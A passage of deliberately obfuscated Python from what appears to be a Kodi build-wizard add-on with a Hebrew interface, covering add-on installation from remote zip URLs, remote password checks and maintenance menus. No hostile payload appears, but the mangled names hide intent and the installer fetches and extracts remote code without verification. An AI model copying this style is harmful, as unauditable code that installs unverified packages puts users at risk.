		OOOOOOOOO0O0OOOOO =wiz .workingURL (OO00O0O00O0O0O000 )#line:2524
		if OOOOOOOOO0O0OOOOO ==True :#line:2525
			O00O0O0OOO0O00O0O =wiz .openURL (OO00O0O00O0O0O000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2526
			OOO000OO0OOOO000O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00000OOO0OO0O00O ).findall (O00O0O0OOO0O00O0O )#line:2527
			if len (OOO000OO0OOOO000O )>0 :#line:2528
				for OO0OOOOOO000OO0OO ,OO00O0O00O0O0O000 ,OOOOO00000OO00O0O ,O00OOOO0O0O00O000 ,O0O0OO0OO0OOOO000 ,O0O0O0O0O00OOO000 ,O0OO0O00OO0O0OO00 ,OO0OOOOO0O00OO0OO ,OO000OOO0OOO0O000 in OOO000OO0OOOO000O :#line:2529
					if os .path .exists (os .path .join (ADDONS ,O00000OOO0OO0O00O )):#line:2530
						OOOOO000O00OOOOO0 =['Launch Addon','Remove Addon']#line:2531
						OOO0O0O00OO0OOO0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOOO000O00OOOOO0 )#line:2532
						if OOO0O0O00OO0OOO0O ==0 :#line:2533
							wiz .ebi ('RunAddon(%s)'%O00000OOO0OO0O00O )#line:2534
							xbmc .sleep (1000 )#line:2535
							return True #line:2536
						elif OOO0O0O00OO0OOO0O ==1 :#line:2537
							wiz .cleanHouse (os .path .join (ADDONS ,O00000OOO0OO0O00O ))#line:2538
							try :wiz .removeFolder (os .path .join (ADDONS ,O00000OOO0OO0O00O ))#line:2539
							except :pass #line:2540
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00000OOO0OO0O00O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2541
								removeAddonData (O00000OOO0OO0O00O )#line:2542
							wiz .refresh ()#line:2543
							return True #line:2544
						else :#line:2545
							return False #line:2546
					OOO0000OO00OO00OO =os .path .join (ADDONS ,OOOOO00000OO00O0O )#line:2547
					if not OOOOO00000OO00O0O .lower ()=='none'and not os .path .exists (OOO0000OO00OO00OO ):#line:2548
						wiz .log ("Repository not installed, installing it")#line:2549
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00000OOO0OO0O00O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOO00000OO00O0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2550
							O000OOOOOO0O0OO0O =wiz .parseDOM (wiz .openURL (O00OOOO0O0O00O000 ),'addon',ret ='version',attrs ={'id':OOOOO00000OO00O0O })#line:2551
							if len (O000OOOOOO0O0OO0O )>0 :#line:2552
								O0O0OO0O0O0O000O0 ='%s%s-%s.zip'%(O0O0OO0OO0OOOO000 ,OOOOO00000OO00O0O ,O000OOOOOO0O0OO0O [0 ])#line:2553
								wiz .log (O0O0OO0O0O0O000O0 )#line:2554
								if KODIV >=17 :wiz .addonDatabase (OOOOO00000OO00O0O ,1 )#line:2555
								installAddon (OOOOO00000OO00O0O ,O0O0OO0O0O0O000O0 )#line:2556
								wiz .ebi ('UpdateAddonRepos()')#line:2557
								wiz .log ("Installing Addon from Kodi")#line:2559
								O0OOOOO0OO0OOOOOO =installFromKodi (O00000OOO0OO0O00O )#line:2560
								wiz .log ("Install from Kodi: %s"%O0OOOOO0OO0OOOOOO )#line:2561
								if O0OOOOO0OO0OOOOOO :#line:2562
									wiz .refresh ()#line:2563
									return True #line:2564
							else :#line:2565
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOOO00000OO00O0O )#line:2566
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00000OOO0OO0O00O ,OOOOO00000OO00O0O ))#line:2567
					elif OOOOO00000OO00O0O .lower ()=='none':#line:2568
						wiz .log ("No repository, installing addon")#line:2569
						OO000OO0O00O00OO0 =O00000OOO0OO0O00O #line:2570
						OOOO000OOOOO000OO =OO00O0O00O0O0O000 #line:2571
						installAddon (O00000OOO0OO0O00O ,OO00O0O00O0O0O000 )#line:2572
						wiz .refresh ()#line:2573
						return True #line:2574
					else :#line:2575
						wiz .log ("Repository installed, installing addon")#line:2576
						O0OOOOO0OO0OOOOOO =installFromKodi (O00000OOO0OO0O00O ,False )#line:2577
						if O0OOOOO0OO0OOOOOO :#line:2578
							wiz .refresh ()#line:2579
							return True #line:2580
					if os .path .exists (os .path .join (ADDONS ,O00000OOO0OO0O00O )):return True #line:2581
					O0000OOO0O000000O =wiz .parseDOM (wiz .openURL (O00OOOO0O0O00O000 ),'addon',ret ='version',attrs ={'id':O00000OOO0OO0O00O })#line:2582
					if len (O0000OOO0O000000O )>0 :#line:2583
						OO00O0O00O0O0O000 ="%s%s-%s.zip"%(OO00O0O00O0O0O000 ,O00000OOO0OO0O00O ,O0000OOO0O000000O [0 ])#line:2584
						wiz .log (str (OO00O0O00O0O0O000 ))#line:2585
						if KODIV >=17 :wiz .addonDatabase (O00000OOO0OO0O00O ,1 )#line:2586
						installAddon (O00000OOO0OO0O00O ,OO00O0O00O0O0O000 )#line:2587
						wiz .refresh ()#line:2588
					else :#line:2589
						wiz .log ("no match");return False #line:2590
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2591
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOOOOOOO0O0OOOOO )#line:2592
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2593
def installFromKodi (OO000O00000OO0OO0 ,over =True ):#line:2595
	if over ==True :#line:2596
		xbmc .sleep (2000 )#line:2597
	wiz .ebi ('RunPlugin(plugin://%s)'%OO000O00000OO0OO0 )#line:2599
	if not wiz .whileWindow ('yesnodialog'):#line:2600
		return False #line:2601
	xbmc .sleep (1000 )#line:2602
	if wiz .whileWindow ('okdialog'):#line:2603
		return False #line:2604
	wiz .whileWindow ('progressdialog')#line:2605
	if os .path .exists (os .path .join (ADDONS ,OO000O00000OO0OO0 )):return True #line:2606
	else :return False #line:2607
def installAddon (O0OOO0O0OOOO00OO0 ,O0OO0O0000OO00OO0 ):#line:2609
	if not wiz .workingURL (O0OO0O0000OO00OO0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OOO0O0OOOO00OO0 ,COLOR2 ));return #line:2610
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2611
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0O0OOOO00OO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2612
	O0O00O0OOOOO00O0O =O0OO0O0000OO00OO0 .split ('/')#line:2613
	OOOO00OOOOO00O0O0 =os .path .join (PACKAGES ,O0O00O0OOOOO00O0O [-1 ])#line:2614
	try :os .remove (OOOO00OOOOO00O0O0 )#line:2615
	except :pass #line:2616
	downloader .download (O0OO0O0000OO00OO0 ,OOOO00OOOOO00O0O0 ,DP )#line:2617
	OOO0OO0000OO000OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0O0OOOO00OO0 )#line:2618
	DP .update (0 ,OOO0OO0000OO000OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2619
	O0O0OO0O000O000O0 ,O0OOO0OO0OOO00000 ,OO0O00000OO00O0O0 =extract .all (OOOO00OOOOO00O0O0 ,ADDONS ,DP ,title =OOO0OO0000OO000OO )#line:2620
	DP .update (0 ,OOO0OO0000OO000OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2621
	installed (O0OOO0O0OOOO00OO0 )#line:2622
	installDep (O0OOO0O0OOOO00OO0 ,DP )#line:2623
	DP .close ()#line:2624
	wiz .ebi ('UpdateAddonRepos()')#line:2625
	wiz .ebi ('UpdateLocalAddons()')#line:2626
	wiz .refresh ()#line:2627
def installDep (O0OOO00OO000O0O0O ,DP =None ):#line:2629
	OOO000OOO0O000OO0 =os .path .join (ADDONS ,O0OOO00OO000O0O0O ,'addon.xml')#line:2630
	if os .path .exists (OOO000OOO0O000OO0 ):#line:2631
		OOO0O0O0OOO00O0OO =open (OOO000OOO0O000OO0 ,mode ='r');O0OO0O0OOO00O0OOO =OOO0O0O0OOO00O0OO .read ();OOO0O0O0OOO00O0OO .close ();#line:2632
		OO0OOOOO0O0000OOO =wiz .parseDOM (O0OO0O0OOO00O0OOO ,'import',ret ='addon')#line:2633
		for O0OO0O00O00OO00O0 in OO0OOOOO0O0000OOO :#line:2634
			if not 'xbmc.python'in O0OO0O00O00OO00O0 :#line:2635
				if not DP ==None :#line:2636
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O00O00OO00O0 ))#line:2637
				wiz .createTemp (O0OO0O00O00OO00O0 )#line:2638
def installed (OOO0OOO0O000OO000 ):#line:2665
	OO000O0O00OOO0OO0 =os .path .join (ADDONS ,OOO0OOO0O000OO000 ,'addon.xml')#line:2666
	if os .path .exists (OO000O0O00OOO0OO0 ):#line:2667
		try :#line:2668
			O0O0OOOO0OOOO0O0O =open (OO000O0O00OOO0OO0 ,mode ='r');O0OOO00O000OO0O00 =O0O0OOOO0OOOO0O0O .read ();O0O0OOOO0OOOO0O0O .close ()#line:2669
			O0OO0OO0000OO0O0O =wiz .parseDOM (O0OOO00O000OO0O00 ,'addon',ret ='name',attrs ={'id':OOO0OOO0O000OO000 })#line:2670
			OOO0OOO000O000000 =os .path .join (ADDONS ,OOO0OOO0O000OO000 ,'icon.png')#line:2671
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0OO0000OO0O0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO0OOO000O000000 )#line:2672
		except :pass #line:2673
def youtubeMenu (url =None ):#line:2675
	if not YOUTUBEFILE =='http://':#line:2676
		if url ==None :#line:2677
			OO00000O000OOOOO0 =wiz .workingURL (YOUTUBEFILE )#line:2678
			OOO00OOO00O000O0O =uservar .YOUTUBEFILE #line:2679
		else :#line:2680
			OO00000O000OOOOO0 =wiz .workingURL (url )#line:2681
			OOO00OOO00O000O0O =url #line:2682
		if OO00000O000OOOOO0 ==True :#line:2683
			O000OO000OO0O0O0O =wiz .openURL (OOO00OOO00O000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2684
			O0000OOO0O0O000O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O000OO000OO0O0O0O )#line:2685
			if len (O0000OOO0O0O000O0 )>0 :#line:2686
				for O0OOOOOOOO0OO0OOO ,OO0O00OO00O00OOOO ,url ,O00OO00OOOOO0OOO0 ,O00O0O0000O00OO00 ,OO0OO000O0000O000 in O0000OOO0O0O000O0 :#line:2687
					if OO0O00OO00O00OOOO .lower ()=="yes":#line:2688
						addDir ("[B]%s[/B]"%O0OOOOOOOO0OO0OOO ,'youtube',url ,description =OO0OO000O0000O000 ,icon =O00OO00OOOOO0OOO0 ,fanart =O00O0O0000O00OO00 ,themeit =THEME3 )#line:2689
					else :#line:2690
						addFile (O0OOOOOOOO0OO0OOO ,'viewVideo',url =url ,description =OO0OO000O0000O000 ,icon =O00OO00OOOOO0OOO0 ,fanart =O00O0O0000O00OO00 ,themeit =THEME2 )#line:2691
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2692
		else :#line:2693
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2694
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2695
			addFile ('%s'%OO00000O000OOOOO0 ,'',themeit =THEME3 )#line:2696
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2697
	setView ('files','viewType')#line:2698
def STARTP ():#line:2699
	O0000OO0OO0O0OO00 =(ADDON .getSetting ("pass"))#line:2700
	if BUILDNAME =="":#line:2701
	 if not NOTIFY =='true':#line:2702
          O0000OOO00O00OOO0 =wiz .workingURL (NOTIFICATION )#line:2703
	 if not NOTIFY2 =='true':#line:2704
          O0000OOO00O00OOO0 =wiz .workingURL (NOTIFICATION2 )#line:2705
	 if not NOTIFY3 =='true':#line:2706
          O0000OOO00O00OOO0 =wiz .workingURL (NOTIFICATION3 )#line:2707
	O0O0000OO0OOOOO00 =O0000OO0OO0O0OO00 #line:2708
	O0000OOO00O00OOO0 =urllib2 .Request (SPEED )#line:2709
	OOOO000O00OO0O000 =urllib2 .urlopen (O0000OOO00O00OOO0 )#line:2710
	O000O0O0OO00O0OO0 =OOOO000O00OO0O000 .readlines ()#line:2712
	O00OOO0OO00O00O00 =0 #line:2716
	for OOO00O00O00OO00OO in O000O0O0OO00O0OO0 :#line:2717
		if OOO00O00O00OO00OO .split (' ==')[0 ]==O0000OO0OO0O0OO00 or OOO00O00O00OO00OO .split ()[0 ]==O0000OO0OO0O0OO00 :#line:2718
			O00OOO0OO00O00O00 =1 #line:2719
			break #line:2720
	if O00OOO0OO00O00O00 ==0 :#line:2721
					OO0O0O0000000O00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2722
					if OO0O0O0000000O00O :#line:2724
						ADDON .openSettings ()#line:2726
						sys .exit ()#line:2728
					else :#line:2729
						sys .exit ()#line:2730
	return 'ok'#line:2734
def STARTP2 ():#line:2735
	O0OO00O0O0000OO0O =(ADDON .getSetting ("user"))#line:2736
	OO00O0O000O0OO00O =(UNAME )#line:2738
	O0OOOO0O00000O0OO =urllib2 .urlopen (OO00O0O000O0OO00O )#line:2739
	O00O00O0O0OO000O0 =O0OOOO0O00000O0OO .readlines ()#line:2740
	OOO000OOOO00O000O =0 #line:2741
	for O0OOO0OOO0OOO0OOO in O00O00O0O0OO000O0 :#line:2744
		if O0OOO0OOO0OOO0OOO .split (' ==')[0 ]==O0OO00O0O0000OO0O or O0OOO0OOO0OOO0OOO .split ()[0 ]==O0OO00O0O0000OO0O :#line:2745
			OOO000OOOO00O000O =1 #line:2746
			break #line:2747
	if OOO000OOOO00O000O ==0 :#line:2748
		OOO0000OOO000O000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2749
		if OOO0000OOO000O000 :#line:2751
			ADDON .openSettings ()#line:2753
			sys .exit ()#line:2756
		else :#line:2757
			sys .exit ()#line:2758
	return 'ok'#line:2762
def passandpin ():#line:2763
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2764
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2765
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2766
def passandUsername ():#line:2767
	ADDON .openSettings ()#line:2769
def folderback ():#line:2772
    O00O0OO0OOOO0OO0O =ADDON .getSetting ("path")#line:2773
    if O00O0OO0OOOO0OO0O :#line:2774
      O00O0OO0OOOO0OO0O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2775
      ADDON .setSetting ("path",O00O0OO0OOOO0OO0O )#line:2776
def backmyupbuild ():#line:2779
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2787
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2788
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2789
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2791
def maintMenu (view =None ):#line:2795
	OOO000O00O0OO0O00 ='[B][COLOR green]ON[/COLOR][/B]';OOO0O00OO00O0OOO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2797
	OO0O0O00O00OOO0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2798
	OO00O0O00O0O00O0O ='true'if AUTOCACHE =='true'else 'false'#line:2799
	O0O0O0OOO0O000O0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2800
	O0O000O0O00000OO0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2801
	OO000OOOOO00O0000 ='true'if SHOWMAINT =='true'else 'false'#line:2802
	OO0000O0OOO00OO0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2803
	O0O00O0O0OO000O0O ='true'if INCLUDEALL =='true'else 'false'#line:2804
	O0OO00OOO00OO0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2805
	if wiz .Grab_Log (True )==False :O0O0O00OOO000OOOO =0 #line:2806
	else :O0O0O00OOO000OOOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2807
	if wiz .Grab_Log (True ,True )==False :O00O0OOO0000000O0 =0 #line:2808
	else :O00O0OOO0000000O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2809
	O0OO0OOOOO0OO000O =int (O0O0O00OOO000OOOO )+int (O00O0OOO0000000O0 )#line:2810
	O00000OO0OO000O0O =str (O0OO0OOOOO0OO000O )+' Error(s) Found'if O0OO0OOOOO0OO000O >0 else 'None Found'#line:2811
	O0OOOOO000O0OO000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2812
	if O0O00O0O0OO000O0O =='true':#line:2813
		OO00000OOOOOOO000 ='true'#line:2814
		O000000OO00OO0O0O ='true'#line:2815
		O00O0OO0OO00OOO00 ='true'#line:2816
		OOO00OO00000OO00O ='true'#line:2817
		OOOOO0O00O0OO0O00 ='true'#line:2818
		O0O00OO0O0OOOOO0O ='true'#line:2819
		O000OOOO000O00OO0 ='true'#line:2820
		O0O00O000O00O00O0 ='true'#line:2821
	else :#line:2822
		OO00000OOOOOOO000 ='true'if INCLUDEBOB =='true'else 'false'#line:2823
		O000000OO00OO0O0O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2824
		O00O0OO0OO00OOO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2825
		OOO00OO00000OO00O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2826
		OOOOO0O00O0OO0O00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2827
		O0O00OO0O0OOOOO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2828
		O000OOOO000O00OO0 ='true'if INCLUDESALTS =='true'else 'false'#line:2829
		O0O00O000O00O00O0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2830
	OO0OO00O00OO0OO00 =wiz .getSize (PACKAGES )#line:2831
	O0OOO0OOOO0000OOO =wiz .getSize (THUMBS )#line:2832
	O00OOO0O00O00OO0O =wiz .getCacheSize ()#line:2833
	O0O00O000000OO00O =OO0OO00O00OO0OO00 +O0OOO0OOOO0000OOO +O00OOO0O00O00OO0O #line:2834
	O0OOOO0OO0OO0O0O0 =['Daily','Always','3 Days','Weekly']#line:2835
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2836
	if view =="clean"or SHOWMAINT =='true':#line:2837
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00O000000OO00O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOO0O00O00OO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO00O00OO0OO00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO0OOOO0000OOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2845
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2846
	if view =="addon"or SHOWMAINT =='false':#line:2847
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2854
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2855
	if view =="misc"or SHOWMAINT =='true':#line:2856
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('View Errors in Log: %s'%(O00000OO0OO000O0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('Clear Wizard Log File%s'%O0OOOOO000O0OO000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2865
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2866
	if view =="backup"or SHOWMAINT =='true':#line:2867
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2877
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2879
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2880
	if view =="tweaks"or SHOWMAINT =='true':#line:2881
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2882
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		else :#line:2884
			if os .path .exists (ADVANCED ):#line:2885
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2886
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2887
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2894
	addFile ('Show All Maintenance: %s'%OO000OOOOO00O0000 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2895
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2896
	addFile ('Third Party Wizards: %s'%O0OO00OOO00OO0OOO .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	if O0OO00OOO00OO0OOO =='true':#line:2898
		OO0OOO0O00OO0OOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2899
		O0O00O00O0O0OO0O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2900
		O0O00O0OOOOO000OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2901
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOO0O00OO0OOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00O00O0O0OO0O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00O0OOOOO000OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2904
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2905
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0O0O00O00OOO0O0 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	if OO0O0O00O00OOO0O0 =='true':#line:2907
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OOOO0OO0OO0O0O0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00O0O00O0O00O0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2909
